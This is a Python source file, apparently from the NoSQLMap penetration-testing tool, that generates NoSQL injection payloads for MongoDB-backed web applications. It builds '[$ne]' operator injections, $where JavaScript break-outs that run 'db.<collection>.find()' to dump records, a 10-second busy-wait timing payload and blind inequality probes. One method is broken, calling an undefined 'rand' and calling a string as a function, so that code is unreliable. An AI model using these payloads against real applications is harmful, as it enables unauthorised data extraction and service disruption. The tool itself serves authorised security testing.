#!/usr/bin/python
# -*- coding: UTF-8 -*-

#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import string
import itertools
import random

def randInjString(size, formatString):
    
    if formatString == 1:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 2:
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 3:
        chars = string.digits
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 4:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'

class InjectionStringCreator:

    leftPart = [
        "a\';",
        "a\";",
        "1;"
        ]    

    rightPart = [
        "var d=\"a",
        "var d=\'a",
        "var d=1"
        ]

    formatAvailables=[1,2,3,4]

    standardSizes = [5,12,19,26,31]

    def __init__(self,size=standardSizes, formats=formatAvailables):
        self.sizes=size
        self.formats = formats

    def createIdString(self):
        for st in itertools.product(self.sizes, self.formats):
            yield "%s" %(randInjString(st[0], st[1]))

    def makeNeqString(self, origString):
        return "%s%s" %("[$ne]=",origString)

    def makeWhereString(self, injString):
        informations = [
            "return db.%s.find();",
            "return db.%s.findOne();",
        ]

        for st in itertools.product(self.leftPart, informations, self.rightPart):
            central = st[1] %(injString)
            yield "%s%s%s" % (st[0],central,st[2])

    def createTimeString(self):
        informations = [
            'var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return;'
                ]
        for st in itertools.product(self.leftPart, informations, self.rightPart):
            yield "%s%s%s" %(st[0],st[1],st[2])

    def createBlindNeqString(self, injString):
        informations = [
            "return this.%s!='",
            "return this.%s!=\"",
        ]
        randCentral = rand(injString(5,2))
        for st in itertools.product(self.leftPart, informations, self.rightPart):
            central = st[1] %(randCentral)
            yield "%s%s%s%s" %(st[0],central,injString,st[2])

        #return "=a'; return this.a != '" + randInjString(size, formatStringString) + "'; var dummy='!"

#    def createThisNeqIntString(size, formatStringString):
#        return "=1; return this.a !=" + randInjString(size, formatStringString) + "; var dummy=1"
